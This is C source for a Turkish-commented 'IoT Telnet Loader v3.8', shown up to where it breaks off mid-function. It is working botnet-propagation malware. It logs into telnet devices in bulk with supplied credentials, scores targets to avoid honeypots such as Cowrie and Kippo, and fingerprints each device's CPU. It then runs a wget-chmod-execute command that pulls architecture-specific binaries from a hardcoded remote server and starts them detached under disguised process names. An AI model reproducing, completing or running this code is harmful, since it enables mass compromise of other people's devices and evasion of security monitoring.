/*
 * ============================================================
 *  IoT Telnet Loader  v3.8  —  Production Grade
 *  Honeypot Detection + Detached Payload + HTTP Binary List
 * ============================================================
 *
 *  v3.7 → v3.8 değişiklikleri:
 *   - Payload dosya adı: kworker  →  getoutt  (indirme sırasında)
 *   - İndirme komutu tek satıra indirildi:
 *       cd /tmp; rm -rf getoutt; wget http://ip/bins/<arch> -O getoutt;
 *       chmod 777 getoutt; ./getoutt <arch>;
 *   - build_dl_cmd artık arch argümanını da alıyor
 *   - Detached execution: setsid + nohup + fallback
 *   - Mevcut honeypot / arch detect / recv_until yapısı KORUNDU
 *
 *  Derleme:  gcc -O2 -Wall -pthread -o loader loader.c
 *  Kullanım: ./loader [ip_list.txt] [thread_sayısı]
 * ============================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <semaphore.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <dirent.h>
#include <sys/stat.h>

/* ═══════════════════════════════════════════════════════════
 *  YAPILANDIRMA
 * ═══════════════════════════════════════════════════════════ */
#define CFG_IP_LIST        "a.txt"
#define CFG_SUCCESS_LOG    "success.txt"
#define CFG_FAIL_LOG       "fail.txt"
#define CFG_HONEYPOT_LOG   "honeypots.txt"

/* ⭐ Payload cihazda çalıştırılacak isim */
#define CFG_PAYLOAD_NAME   "kworkerr"

#define CFG_MAX_THREADS    150
#define CFG_MAX_TARGETS    100000
#define CFG_CONN_TIMEOUT   6
#define CFG_READ_TIMEOUT   10
#define CFG_DL_TIMEOUT     30
#define CFG_INTER_CMD_MS   150
#define CFG_IDLE_TIMEOUT   3

/* ⭐ HTTP sunucu */
#define CFG_HTTP_SERVER    "http://85.137.53.167:5000"
#define CFG_HTTP_HOST      "85.137.53.167"
#define CFG_HTTP_PORT      5000
#define CFG_HTTP_LIST_PATH "/"

#define CFG_TFTP_SERVER    "192.168.1.100"

#define HP_SCORE_THRESHOLD 100

/* ═══════════════════════════════════════════════════════════
 *  RENK KODLARI
 * ═══════════════════════════════════════════════════════════ */
#define COL_RST   "\033[0m"
#define COL_RED   "\033[1;31m"
#define COL_GRN   "\033[1;32m"
#define COL_YEL   "\033[1;33m"
#define COL_CYN   "\033[1;36m"
#define COL_MAG   "\033[1;35m"
#define COL_WHT   "\033[1;37m"
#define COL_GRY   "\033[0;37m"

/* ═══════════════════════════════════════════════════════════
 *  VERİ YAPILARI
 * ═══════════════════════════════════════════════════════════ */
typedef struct {
    char ip[46];
    int  port;
    char user[64];
    char pass[64];
} Target;

typedef enum {
    DL_NONE = 0,
    DL_BUSYBOX_WGET,
    DL_TFTP,
    DL_WGET,
    DL_CURL
} DlType;

static const char *DL_NAMES[] = {
    "none", "busybox-wget", "busybox-tftp", "wget", "curl"
};

typedef enum {
    HP_NONE = 0,
    HP_PROMPT,
    HP_SYSINFO,
    HP_FS,
    HP_FAKE_CRED,
    HP_BEHAVIOR
} HpType;

static const char *HP_NAMES[] = {
    "none", "prompt", "sysinfo", "filesystem", "fake_cred", "behavior"
};

typedef struct {
    const char *keyword;
    const char *binname;
} ArchEntry;

static const ArchEntry ARCH_MAP[] = {
    { "x86_64",         "client_x64"     },
    { "amd64",          "client_x64"     },
    { "x86-64",         "client_x64"     },
    { "x64",            "client_x64"     },
    { "i686",           "client_x86"     },
    { "i586",           "client_x86"     },
    { "i486",           "client_x86"     },
    { "i386",           "client_x86"     },
    { "i86pc",          "client_x86"     },

    { "mips64el",       "client_mpsl"    },
    { "mips64le",       "client_mpsl"    },
    { "mips32el",       "client_mpsl"    },
    { "mipsel",         "client_mpsl"    },
    { "mipsle",         "client_mpsl"    },
    { "mipsisa32el",    "client_mpsl"    },
    { "mipsisa64el",    "client_mpsl"    },

    { "mips64",         "client_mps64"   },
    { "mips n32",       "client_mps64"   },
    { "mips64r",        "client_mps64"   },
    { "mipsisa64",      "client_mps64"   },
    { "octeon",         "client_mps64"   },
    { "cavium",         "client_mps64"   },
    { "loongson64",     "client_mps64"   },

    { "mipsisa32",      "client_mips"    },
    { "mips32",         "client_mips"    },
    { "mips ii",        "client_mips"    },
    { "mips r",         "client_mips"    },
    { "mips technol",   "client_mips"    },
    { "mips",           "client_mips"    },

    { "aarch64",        "client_arm64"   },
    { "arm64",          "client_arm64"   },
    { "armv8",          "client_arm64"   },

    { "armv7hl",        "client_arm7"    },
    { "armv7l",         "client_arm7"    },
    { "armv7-a",        "client_arm7"    },
    { "armv7",          "client_arm7"    },
    { "cortex-a5",      "client_arm7"    },
    { "cortex-a7",      "client_arm7"    },
    { "cortex-a8",      "client_arm7"    },
    { "cortex-a9",      "client_arm7"    },
    { "cortex-a12",     "client_arm7"    },
    { "cortex-a15",     "client_arm7"    },
    { "cortex-a17",     "client_arm7"    },

    { "armv6l",         "client_arm6"    },
    { "armv6",          "client_arm6"    },
    { "arm1176",        "client_arm6"    },
    { "bcm2835",        "client_arm6"    },
    { "arm11",          "client_arm6"    },

    { "armv5tejl",      "client_arm5"    },
    { "armv5tel",       "client_arm5"    },
    { "armv5tej",       "client_arm5"    },
    { "armv5te",        "client_arm5"    },
    { "armv5l",         "client_arm5"    },
    { "armv5",          "client_arm5"    },
    { "armv4t",         "client_arm5"    },
    { "armv4",          "client_arm5"    },
    { "arm926",         "client_arm5"    },
    { "arm920",         "client_arm5"    },
    { "arm9",           "client_arm5"    },
    { "xscale",         "client_arm5"    },
    { "ixp4",           "client_arm5"    },
    { "fa526",          "client_arm5"    },

    { "arm",            "client_arm"     },

    { "ppc64le",        "client_ppc"     },
    { "ppc64",          "client_ppc"     },
    { "ppc32",          "client_ppc"     },
    { "powerpc64",      "client_ppc"     },
    { "powerpc",        "client_ppc"     },
    { "ppc",            "client_ppc"     },
    { "power mac",      "client_ppc"     },

    { "sparc64",        "client_spc"     },
    { "sparc32plus",    "client_spc"     },
    { "sparcv9",        "client_spc"     },
    { "sparc",          "client_spc"     },
    { "sun4u",          "client_spc"     },
    { "sun4v",          "client_spc"     },
    { "leon",           "client_spc"     },

    { "m68k",           "client_m68k"    },
    { "coldfire",       "client_m68k"    },
    { "68040",          "client_m68k"    },
    { "68030",          "client_m68k"    },
    { "68020",          "client_m68k"    },
    { "68k",            "client_m68k"    },

    { "sh-4",           "client_sh4"     },
    { "sh4",            "client_sh4"     },
    { "superh",         "client_sh4"     },
    { "sh775",          "client_sh4"     },
    { "sh778",          "client_sh4"     },
    { "sh-x3",          "client_sh4"     },

    { "arcompact",      "client_arc"     },
    { "arc 700",        "client_arc"     },
    { "arc700",         "client_arc"     },
    { "arc em",         "client_arc"     },
    { "arc hs",         "client_arc"     },
    { "synopsys",       "client_arc"     },
    { "designware",     "client_arc"     },

    { "riscv64",        "client_riscv64" },
    { "risc-v64",       "client_riscv64" },
    { "rv64",           "client_riscv64" },
    { "rv64i",          "client_riscv64" },
    { "rv64g",          "client_riscv64" },

    { "riscv32",        "client_riscv32" },
    { "risc-v32",       "client_riscv32" },
    { "rv32",           "client_riscv32" },
    { "rv32i",          "client_riscv32" },
    { "rv32g",          "client_riscv32" },

    { "riscv",          "client_riscv32" },
    { "risc-v",         "client_riscv32" },

    { NULL, NULL }
};

/* ═══════════════════════════════════════════════════════════
 *  GLOBAL DURUM
 * ═══════════════════════════════════════════════════════════ */
static Target          *g_targets    = NULL;
static int              g_total      = 0;
static volatile int     g_stop       = 0;

static pthread_mutex_t  g_stat_mu    = PTHREAD_MUTEX_INITIALIZER;
static long             g_stat_try   = 0;
static long             g_stat_ok    = 0;
static long             g_stat_fail  = 0;
static long             g_stat_active= 0;
static long             g_stat_hp    = 0;

static pthread_mutex_t  g_log_mu     = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t  g_print_mu   = PTHREAD_MUTEX_INITIALIZER;

static FILE            *g_fp_success = NULL;
static FILE            *g_fp_fail    = NULL;
static FILE            *g_fp_hp      = NULL;

static sem_t            g_sem;

static time_t           g_start_time;

#define MAX_BINS 64
static char             g_available_bins[MAX_BINS][32];
static int              g_available_count = 0;

/* ═══════════════════════════════════════════════════════════
 *  ZAMAN
 * ═══════════════════════════════════════════════════════════ */
static void timestamp(char *buf, size_t sz)
{
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buf, sz, "%Y-%m-%d %H:%M:%S", t);
}

/* ═══════════════════════════════════════════════════════════
 *  LOG
 * ═══════════════════════════════════════════════════════════ */
static void log_open_files(void)
{
    g_fp_success = fopen(CFG_SUCCESS_LOG,  "a");
    g_fp_fail    = fopen(CFG_FAIL_LOG,     "a");
    g_fp_hp      = fopen(CFG_HONEYPOT_LOG, "a");
    if (g_fp_success) setvbuf(g_fp_success, NULL, _IOLBF, 0);
    if (g_fp_fail)    setvbuf(g_fp_fail,    NULL, _IOLBF, 0);
    if (g_fp_hp)      setvbuf(g_fp_hp,      NULL, _IOLBF, 0);
}

static void log_close_files(void)
{
    if (g_fp_success) { fclose(g_fp_success); g_fp_success = NULL; }
    if (g_fp_fail)    { fclose(g_fp_fail);    g_fp_fail    = NULL; }
    if (g_fp_hp)      { fclose(g_fp_hp);      g_fp_hp      = NULL; }
}

static void log_append(FILE *fp, const char *ip, int port,
                       const char *user, const char *pass,
                       const char *msg)
{
    if (!fp) return;
    char ts[32];
    timestamp(ts, sizeof(ts));
    pthread_mutex_lock(&g_log_mu);
    fprintf(fp, "[%s] %s:%d | %s:%s | %s\n",
            ts, ip, port, user, pass, msg);
    pthread_mutex_unlock(&g_log_mu);
}

/* ═══════════════════════════════════════════════════════════
 *  RENKLI PRINT
 * ═══════════════════════════════════════════════════════════ */
static void cprint(const char *color, const char *tag,
                   const char *fmt, ...)
{
    va_list ap;
    char msg[1024];
    va_start(ap, fmt);
    vsnprintf(msg, sizeof(msg), fmt, ap);
    va_end(ap);

    pthread_mutex_lock(&g_print_mu);
    printf("%s[%s]%s %s\n", color, tag, COL_RST, msg);
    fflush(stdout);
    pthread_mutex_unlock(&g_print_mu);
}

#define LOG_OK(...)   cprint(COL_GRN, " OK ", __VA_ARGS__)
#define LOG_ERR(...)  cprint(COL_RED, "FAIL", __VA_ARGS__)
#define LOG_INF(...)  cprint(COL_CYN, "INFO", __VA_ARGS__)
#define LOG_WRN(...)  cprint(COL_YEL, "WARN", __VA_ARGS__)
#define LOG_HP(...)   cprint(COL_MAG, " HNY", __VA_ARGS__)

/* ═══════════════════════════════════════════════════════════
 *  BASİT HTTP CLIENT
 * ═══════════════════════════════════════════════════════════ */
static int http_get(const char *host, int port, const char *path,
                    char *out, size_t outsz, int timeout_sec)
{
    if (!host || !path || !out || outsz == 0) return -1;
    out[0] = '\0';

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);

    if (inet_pton(AF_INET, host, &sa.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(host);
        if (!he) return -1;
        memcpy(&sa.sin_addr, he->h_addr_list[0], (size_t)he->h_length);
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct timeval tv = { timeout_sec, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }

    char req[1024];
    int rlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: loader/3.8\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, port);

    if (send(fd, req, (size_t)rlen, MSG_NOSIGNAL) < 0) {
        close(fd);
        return -1;
    }

    size_t total = 0;
    ssize_t n;
    while ((n = recv(fd, out + total, outsz - 1 - total, 0)) > 0) {
        total += (size_t)n;
        if (total >= outsz - 1) break;
    }
    out[total] = '\0';
    close(fd);

    char *body = strstr(out, "\r\n\r\n");
    if (!body) {
        body = strstr(out, "\n\n");
        if (body) body += 2;
    } else {
        body += 4;
    }

    if (!body) {
        out[0] = '\0';
        return -1;
    }

    size_t body_len = strlen(body);
    memmove(out, body, body_len);
    out[body_len] = '\0';

    return 0;
}

/* ═══════════════════════════════════════════════════════════
 *  JSON PARSER
 * ═══════════════════════════════════════════════════════════ */
static int parse_json_names(const char *json,
                            char names[][32], int max_names)
{
    if (!json) return 0;
    int count = 0;

    const char *p = json;
    while (count < max_names) {
        p = strstr(p, "\"name\"");
        if (!p) break;
        p += 6;

        while (*p && *p != ':') p++;
        if (!*p) break;
        p++;

        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
        if (*p != '"') continue;
        p++;

        const char *start = p;
        while (*p && *p != '"') {
            if (*p == '\\' && *(p+1)) p += 2;
            else p++;
        }
        size_t len = (size_t)(p - start);
        if (len > 0 && len < 32) {
            memcpy(names[count], start, len);
            names[count][len] = '\0';
            count++;
        }
        if (*p == '"') p++;
    }
    return count;
}

/* ═══════════════════════════════════════════════════════════
 *  HTTP'DEN BİNARY LİSTESİNİ ÇEK
 * ═══════════════════════════════════════════════════════════ */
static int fetch_available_bins(void)
{
    char *body = malloc(65536);
    if (!body) {
        fprintf(stderr, COL_RED
                "[!] fetch_available_bins: malloc hatası\n" COL_RST);
        return -1;
    }

    if (http_get(CFG_HTTP_HOST, CFG_HTTP_PORT, CFG_HTTP_LIST_PATH,
                 body, 65536, 10) < 0) {
        fprintf(stderr, COL_RED
                "[!] HTTP listesi alınamadı: http://%s:%d%s\n"
                "    HTTP sunucu çalışıyor mu?\n" COL_RST,
                CFG_HTTP_HOST, CFG_HTTP_PORT, CFG_HTTP_LIST_PATH);
        free(body);
        return -1;
    }

    int n = parse_json_names(body, g_available_bins, MAX_BINS);
    free(body);

    g_available_count = n;

    printf(COL_GRN "[*] HTTP sunucudan %d binary alındı:\n" COL_RST, n);
    for (int i = 0; i < n; i++) {
        printf("      %s\n", g_available_bins[i]);
    }
    printf("\n");

    return (n > 0) ? 0 : -1;
}

static int bin_available(const char *binname)
{
    if (!binname) return 0;
    for (int i = 0; i < g_available_count; i++) {
        if (strcmp(g_available_bins[i], binname) == 0)
            return 1;
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════
 *  TCP CONNECT
 * ═══════════════════════════════════════════════════════════ */
#ifndef TCP_NODELAY
#define TCP_NODELAY 1
#endif

static int tcp_connect(const char *ip, int port, int timeout_sec)
{
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);

    if (inet_pton(AF_INET, ip, &sa.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(ip);
        if (!he) return -1;
        memcpy(&sa.sin_addr, he->h_addr_list[0], (size_t)he->h_length);
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);

    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    if (r < 0 && errno != EINPROGRESS) { close(fd); return -1; }

    fd_set ws; FD_ZERO(&ws); FD_SET(fd, &ws);
    struct timeval tv = { timeout_sec, 0 };
    r = select(fd + 1, NULL, &ws, NULL, &tv);
    if (r <= 0) { close(fd); return -1; }

    int err = 0; socklen_t el = sizeof(err);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el);
    if (err) { close(fd); return -1; }

    fcntl(fd, F_SETFL, fl);
    return fd;
}

/* ═══════════════════════════════════════════════════════════
 *  TELNET IAC + CHUNK RECV
 * ═══════════════════════════════════════════════════════════ */
#define RBUF_SZ      8192
#define RECV_TAIL_SZ 2048

typedef struct {
    int    fd;
    char   buf[RBUF_SZ];
    size_t len;
} RecvCtx;

static void rctx_init(RecvCtx *r, int fd)
{
    r->fd  = fd;
    r->len = 0;
    memset(r->buf, 0, RBUF_SZ);
}

static void iac_reply(int fd, unsigned char cmd, unsigned char opt)
{
    unsigned char resp[3];
    resp[0] = 0xFF;
    resp[1] = (cmd == 0xFD || cmd == 0xFB) ? 0xFC : 0xFE;
    resp[2] = opt;
    send(fd, resp, 3, MSG_NOSIGNAL);
}

static int recv_until(RecvCtx *ctx, const char *needle,
                      char *outbuf, size_t outsz,
                      int timeout_sec)
{
    if (outbuf && outsz) outbuf[0] = '\0';
    size_t opos = 0;
    time_t deadline  = time(NULL) + timeout_sec;
    time_t last_data = time(NULL);

    while (time(NULL) < deadline) {
        if (ctx->len == 0) {
            fd_set rs; FD_ZERO(&rs); FD_SET(ctx->fd, &rs);
            int rem = (int)(deadline - time(NULL));
            if (rem <= 0) break;
            struct timeval tv = { rem, 0 };
            int r = select(ctx->fd + 1, &rs, NULL, NULL, &tv);
            if (r <= 0) {
                if (!needle && (time(NULL) - last_data) >= CFG_IDLE_TIMEOUT)
                    break;
                continue;
            }
            ssize_t n = recv(ctx->fd, ctx->buf, RBUF_SZ - 1, 0);
            if (n <= 0) return -1;
            ctx->len = (size_t)n;
            last_data = time(NULL);
        }

        char   tmp[RBUF_SZ];
        size_t new_len = 0;
        size_t i = 0;

        while (i < ctx->len) {
            unsigned char c = (unsigned char)ctx->buf[i];

            if (c == 0xFF) {
                if (i + 2 < ctx->len) {
                    iac_reply(ctx->fd, ctx->buf[i+1], ctx->buf[i+2]);
                    i += 3;
                    continue;
                }
                memmove(ctx->buf, ctx->buf + i, ctx->len - i);
                ctx->len -= i;
                i = ctx->len;
                break;
            }

            tmp[new_len++] = (char)c;
            i++;
        }

        if (i >= ctx->len) {
            ctx->len = 0;
        }

        if (new_len == 0) {
            if (!needle && (time(NULL) - last_data) >= CFG_IDLE_TIMEOUT)
                break;
            continue;
        }

        if (outbuf && outsz) {
            if (opos + new_len >= outsz - 1) {
                size_t tail = (opos > RECV_TAIL_SZ) ? RECV_TAIL_SZ : opos;
                memmove(outbuf, outbuf + opos - tail, tail);
                opos = tail;
            }

            size_t space = outsz - 1 - opos;
            size_t copy  = (new_len < space) ? new_len : space;
            memcpy(outbuf + opos, tmp, copy);
            opos += copy;
            outbuf[opos] = '\0';

            if (needle && strstr(outbuf, needle))
                return (int)opos;
        } else {
            if (needle && strstr(tmp, needle))
                return (int)new_len;
        }

        if (!needle && (time(NULL) - last_data) >= CFG_IDLE_TIMEOUT)
            break;
    }

    if (outbuf && opos > 0) return (int)opos;
    return -1;
}

/* ═══════════════════════════════════════════════════════════
 *  KOMUT GÖNDER + YANIT OKU
 * ═══════════════════════════════════════════════════════════ */
static int send_cmd(RecvCtx *ctx, const char *cmd,
                    char *resp, size_t rsz,
                    const char *needle, int timeout_sec)
{
    usleep((useconds_t)CFG_INTER_CMD_MS * 1000);

    char line[4096];
    int  len = snprintf(line, sizeof(line), "%s\r\n", cmd);
    if (len < 0 || len >= (int)sizeof(line)) {
        len = (int)sizeof(line) - 3;
        line[len++] = '\r';
        line[len++] = '\n';
    }
    if (send(ctx->fd, line, (size_t)len, MSG_NOSIGNAL) < 0)
        return -1;

    if (resp && rsz) resp[0] = '\0';
    return recv_until(ctx, needle, resp, rsz, timeout_sec);
}

static void drain(RecvCtx *ctx, int ms)
{
    char tmp[1024];
    fd_set rs;
    struct timeval tv;
    time_t deadline = time(NULL) + (ms / 1000) + 1;

    ctx->len = 0;

    while (time(NULL) < deadline) {
        FD_ZERO(&rs); FD_SET(ctx->fd, &rs);
        tv.tv_sec  = 0;
        tv.tv_usec = ms * 1000;
        int r = select(ctx->fd + 1, &rs, NULL, NULL, &tv);
        if (r <= 0) break;
        ssize_t n = recv(ctx->fd, tmp, sizeof(tmp), 0);
        if (n <= 0) break;
    }
}

/* ═══════════════════════════════════════════════════════════
 *  PROMPT TESPİTİ
 * ═══════════════════════════════════════════════════════════ */
static int is_shell_prompt(const char *buf)
{
    if (!buf) return 0;
    const char *signs[] = {
        "\n# ", "\n$ ", "\n> ", "\n% ",
        "\r\n# ", "\r\n$ ", "\r\n> ",
        "# ",  "$ ",  "> ",
        NULL
    };
    for (int i = 0; signs[i]; i++)
        if (strstr(buf, signs[i])) return 1;
    return 0;
}

static int is_login_prompt(const char *buf)
{
    if (!buf) return 0;
    const char *signs[] = {
        "login:", "Login:", "LOGIN:",
        "Username:", "username:",
        "User:", "user:",
        NULL
    };
    for (int i = 0; signs[i]; i++)
        if (strstr(buf, signs[i])) return 1;
    return 0;
}

static int is_pass_prompt(const char *buf)
{
    if (!buf) return 0;
    const char *signs[] = {
        "assword:", "PASSWORD:",
        "assword :", "PASS:",
        NULL
    };
    for (int i = 0; signs[i]; i++)
        if (strstr(buf, signs[i])) return 1;
    return 0;
}

/* ═══════════════════════════════════════════════════════════
 *  HONEYPOT TESPİTİ
 * ═══════════════════════════════════════════════════════════ */
static const char *HP_STRINGS[] = {
    "cowrie", "kippo", "Cowrie", "Kippo",
    "cowrie@", "kippo@",
    "dionaea", "Dionaea",
    "glastopf", "Glastopf",
    "honeytrap", "HoneyTrap",
    "honeydb", "HoneyDB",
    "honeypot", "Honeypot", "HONEYPOT",
    "root@honeypot",
    NULL
};

static int hp_has_signature(const char *buf)
{
    if (!buf) return 0;
    for (int i = 0; HP_STRINGS[i]; i++) {
        if (strstr(buf, HP_STRINGS[i])) return 1;
    }
    return 0;
}

static int hp_check_sysinfo(const char *buf)
{
    if (!buf) return 0;
    if (strstr(buf, "cpu MHz\t\t: 0.000")) return 1;
    if (strstr(buf, "cpu MHz         : 0.000")) return 1;
    {
        int count = 0;
        const char *p = buf;
        while ((p = strstr(p, "processor\t: 0")) != NULL) {
            count++;
            p += 14;
        }
        if (count >= 3) return 1;
    }
    return 0;
}

static int hp_check_filesystem(const char *buf)
{
    if (!buf) return 0;
    if (strstr(buf, "/dev/root") && !strstr(buf, "ext") &&
        !strstr(buf, "jffs2") && !strstr(buf, "ubifs") &&
        !strstr(buf, "squashfs")) {
        return 1;
    }
    return 0;
}

static const char *SUSPICIOUS_CREDS[] = {
    "admin:admin",
    "admin:password",
    "test:test",
    "guest:guest",
    "user:user",
    "default:default",
    NULL
};

static int hp_is_suspicious_cred(const char *user, const char *pass)
{
    if (!user || !pass) return 0;
    char combo[128];
    snprintf(combo, sizeof(combo), "%s:%s", user, pass);
    for (int i = 0; SUSPICIOUS_CREDS[i]; i++) {
        if (strcmp(combo, SUSPICIOUS_CREDS[i]) == 0) return 1;
    }
    return 0;
}

static int hp_calc_score(const char *buf,
                         const char *user, const char *pass,
                         int fake_cred_accepted,
                         int suspicious_cred)
{
    (void)user; (void)pass;
    int score = 0;

    if (hp_has_signature(buf))     score += 100;
    if (hp_check_sysinfo(buf))     score += 50;
    if (hp_check_filesystem(buf))  score += 50;
    if (fake_cred_accepted)        score += 80;
    if (suspicious_cred)           score += 5;

    return score;
}

static void hp_make_fake_cred(char *user, size_t usize,
                              char *pass, size_t psize)
{
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";

    unsigned int seed = (unsigned int)time(NULL)
                      ^ (unsigned int)(uintptr_t)pthread_self()
                      ^ (unsigned int)getpid();
    srand(seed);

    size_t ulen = 8 + (size_t)(rand() % 4);
    size_t plen = 10 + (size_t)(rand() % 6);

    if (ulen >= usize) ulen = usize - 1;
    if (plen >= psize) plen = psize - 1;

    for (size_t i = 0; i < ulen; i++)
        user[i] = charset[rand() % (sizeof(charset) - 1)];
    user[ulen] = '\0';

    for (size_t i = 0; i < plen; i++)
        pass[i] = charset[rand() % (sizeof(charset) - 1)];
    pass[plen] = '\0';
}

static int hp_fake_cred_test(const char *ip, int port)
{
    char fake_user[32];
    char fake_pass[32];
    hp_make_fake_cred(fake_user, sizeof(fake_user),
                      fake_pass, sizeof(fake_pass));

    int fd = tcp_connect(ip, port, CFG_CONN_TIMEOUT);
    if (fd < 0) return 0;

    RecvCtx ctx;
    rctx_init(&ctx, fd);

    char buf[4096];

    memset(buf, 0, sizeof(buf));
    recv_until(&ctx, NULL, buf, sizeof(buf), 3);

    if (hp_has_signature(buf)) { close(fd); return 1; }

    int has_login = is_login_prompt(buf);
    int has_pass  = is_pass_prompt(buf);

    if (!has_login && !has_pass) {
        close(fd);
        return 0;
    }

    if (has_login) {
        usleep(80000);
        send(fd, fake_user, strlen(fake_user), MSG_NOSIGNAL);
        send(fd, "\r\n", 2, MSG_NOSIGNAL);
        memset(buf, 0, sizeof(buf));
        recv_until(&ctx, "assword", buf, sizeof(buf), CFG_READ_TIMEOUT);
    }

    if (is_pass_prompt(buf)) {
        usleep(80000);
        send(fd, fake_pass, strlen(fake_pass), MSG_NOSIGNAL);
        send(fd, "\r\n", 2, MSG_NOSIGNAL);
        usleep(300000);
        memset(buf, 0, sizeof(buf));
        recv_until(&ctx, NULL, buf, sizeof(buf), 3);
    } else {
        close(fd);
        return 0;
    }

    int accepted = is_shell_prompt(buf) ? 1 : 0;
    close(fd);
    return accepted;
}

/* ═══════════════════════════════════════════════════════════
 *  TELNET LOGIN
 * ═══════════════════════════════════════════════════════════ */
static int telnet_login(RecvCtx *ctx,
                        const char *user, const char *pass,
                        HpType *out_hp)
{
    char buf[4096];
    if (out_hp) *out_hp = HP_NONE;

    memset(buf, 0, sizeof(buf));
    recv_until(ctx, NULL, buf, sizeof(buf), 3);

    if (hp_has_signature(buf)) {
        if (out_hp) *out_hp = HP_PROMPT;
        return 0;
    }

    if (is_login_prompt(buf)) {
        usleep(80000);
        send(ctx->fd, user, strlen(user), MSG_NOSIGNAL);
        send(ctx->fd, "\r\n", 2, MSG_NOSIGNAL);
        memset(buf, 0, sizeof(buf));
        recv_until(ctx, "assword", buf, sizeof(buf), CFG_READ_TIMEOUT);
    }

    if (is_pass_prompt(buf)) {
        usleep(80000);
        send(ctx->fd, pass, strlen(pass), MSG_NOSIGNAL);
        send(ctx->fd, "\r\n", 2, MSG_NOSIGNAL);
        usleep(300000);
        memset(buf, 0, sizeof(buf));
        recv_until(ctx, NULL, buf, sizeof(buf), 3);
    }

    if (is_shell_prompt(buf)) return 1;

    if (strstr(buf, "incorrect") || strstr(buf, "denied") ||
        strstr(buf, "invalid")   || strstr(buf, "failed"))
        return 0;

    drain(ctx, 500);
    memset(buf, 0, sizeof(buf));
    recv_until(ctx, NULL, buf, sizeof(buf), 3);

    if (hp_has_signature(buf)) {
        if (out_hp) *out_hp = HP_PROMPT;
        return 0;
    }

    return is_shell_prompt(buf);
}

/* ═══════════════════════════════════════════════════════════
 *  MİMARİ TESPİTİ
 * ═══════════════════════════════════════════════════════════ */
static int word_match(const char *hay, const char *needle)
{
    size_t nlen = strlen(needle);
    const char *p = hay;
    while ((p = strstr(p, needle)) != NULL) {
        int left_ok  = (p == hay) || !((p[-1] >= 'a' && p[-1] <= 'z') ||
                                       (p[-1] >= 'A' && p[-1] <= 'Z') ||
                                       (p[-1] >= '0' && p[-1] <= '9'));
        char r = p[nlen];
        int right_ok = (r == '\0') ||
                       !((r >= 'a' && r <= 'z') ||
                         (r >= 'A' && r <= 'Z') ||
                         (r >= '0' && r <= '9') ||
                         r == '.' || r == '_' || r == '-');
        if (left_ok && right_ok) return 1;
        p += nlen;
    }
    return 0;
}

static const char *arch_find_bin(const char *buf)
{
    if (!buf || !buf[0]) return NULL;

    static __thread char low[32768];
    size_t max = sizeof(low) - 1;
    size_t i = 0;

    for (; buf[i] && i < max; i++) {
        char c = buf[i];
        low[i] = (c >= 'A' && c <= 'Z') ? (char)(c | 0x20) : c;
    }
    low[i] = '\0';

    for (int j = 0; ARCH_MAP[j].keyword; j++) {
        const char *kw = ARCH_MAP[j].keyword;
        if (strlen(kw) >= 5) {
            if (word_match(low, kw))
                return ARCH_MAP[j].binname;
        }
    }
    for (int j = 0; ARCH_MAP[j].keyword; j++) {
        const char *kw = ARCH_MAP[j].keyword;
        if (strlen(kw) < 5) {
            if (strstr(low, kw))
                return ARCH_MAP[j].binname;
        }
    }
    return NULL;
}

static const char *detect_arch(RecvCtx *ctx, HpType *out_hp)
{
    char buf[16384];
    const char *bin = NULL;
    if (out_hp) *out_hp = HP_NONE;

    memset(buf, 0, sizeof(buf));
    int rc = send_cmd(ctx,
        "uname -m 2>/dev/null; echo '|1|'; "
        "uname -a 2>/dev/null; echo '|2|'; "
        "cat /proc/cpuinfo 2>/dev/null; echo '|3|'; "
        "cat /proc/version 2>/dev/null; echo '|4|'; "
        "cat /proc/mounts 2>/dev/null; echo '|5|'; "
        "echo ARCH_END",
        buf, sizeof(buf), "ARCH_END", CFG_READ_TIMEOUT + 4);

    if (rc > 0) {
        if (hp_has_signature(buf)) {
            if (out_hp) *out_hp = HP_PROMPT;
            return NULL;
        }
        if (hp_check_sysinfo(buf)) {
            if (out_hp) *out_hp = HP_SYSINFO;
            return NULL;
        }
        if (hp_check_filesystem(buf)) {
            if (out_hp) *out_hp = HP_FS;
            return NULL;
        }

        bin = arch_find_bin(buf);
        if (bin && bin_available(bin)) return bin;
    }

    memset(buf, 0, sizeof(buf));
    rc = send_cmd(ctx,
        "file /bin/busybox /bin/sh /bin/ls /sbin/init 2>/dev/null; "
        "echo '|A|'; "
        "ls /lib/ld* /lib64/ld* /lib/ld-musl-* /usr/lib/ld* "
            "2>/dev/null; "
        "echo '|B|'; "
        "ls /lib/libc.so* /lib/libuClibc* /lib/libc.musl* "
